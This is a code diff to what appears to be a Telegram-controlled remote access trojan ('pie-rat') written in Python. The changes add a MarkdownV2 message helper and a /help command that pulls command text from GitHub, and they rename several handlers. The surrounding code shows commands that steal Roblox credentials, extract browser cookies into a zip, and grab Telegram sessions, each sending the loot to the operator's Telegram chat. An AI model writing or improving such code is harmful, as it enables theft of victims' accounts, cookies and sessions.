@@ -41,6 +41,7 @@ NOTIFY_CHATID = ""
 
 
 
+
 redis_client = redis.Redis(
     host= REDIS_HOST,
     port=REDIS_PORT,
@@ -218,6 +219,10 @@ async def send_markdown(chat_id, markdown_text):
     payload = {"chat_id": chat_id, "text": markdown_text, "parse_mode": "Markdown"}
     requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)
 
+async def send_markdownv2(chat_id, markdown_text):
+    """Send a MarkdownV2-formatted message via Telegram."""
+    payload = {"chat_id": chat_id, "text": markdown_text, "parse_mode": "MarkdownV2"}
+    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)
 
 def is_target_computer():
     """
@@ -1232,15 +1237,22 @@ async def handle_status(data, *args):
     
     await send_message(NOTIFY_CHATID, f"Computer {COMPUTER_ID} is active.")
 
+@command_handler("/help")
+async def handle_help(data, *args):
+    try:
+        await send_markdownv2(NOTIFY_CHATID, requests.get("https://raw.githubusercontent.com/glo-stick/pie-rat/refs/heads/main/libs/commands.txt").text)
+    except:
+        await send_message(NOTIFY_CHATID, "Failed to retrieve help info.")
+    
 
 
 @command_handler("/roblox")
-async def handle_status(data, *args):
+async def handle_roblox(data, *args):
     for i in steal_roblox():
         await send_markdown(chat_id=NOTIFY_CHATID, markdown_text=i)
 
 @command_handler("/cookies")
-async def handle_status(data, *args):
+async def handle_cookies(data, *args):
     extractor = BrowserCookieExtractor()
 
     
@@ -1252,7 +1264,7 @@ async def handle_status(data, *args):
     await send_document(chat_id=NOTIFY_CHATID, document_path=zip_file_path)
 
 @command_handler("/telegram_session")
-async def handle_status(data, *args):
+async def handle_tgsession(data, *args):
     
     try:
         zip_file_path = telegram_steal()
